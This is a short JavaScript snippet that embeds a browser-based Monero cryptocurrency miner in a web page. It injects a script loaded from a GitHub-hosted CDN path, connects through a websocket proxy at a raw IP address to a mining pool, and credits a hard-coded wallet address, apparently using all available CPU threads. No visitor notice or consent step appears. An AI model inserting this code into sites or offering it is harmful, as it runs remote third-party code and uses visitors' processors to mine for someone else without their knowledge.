// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725";
var pool = "gulf.moneroocean.stream:10128";
var walletAddress = "82yaNedanyNYt6dSFFsmtuA99ULw5RNzeB23BMp66Mdp63Pg2tB1NpubJxSmu71ZLzif5hFvmiMNFAo4mVxjGw8QUwRPHkn";
var workerId = "GH-MINER"
var threads = -1;
var password = "x";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
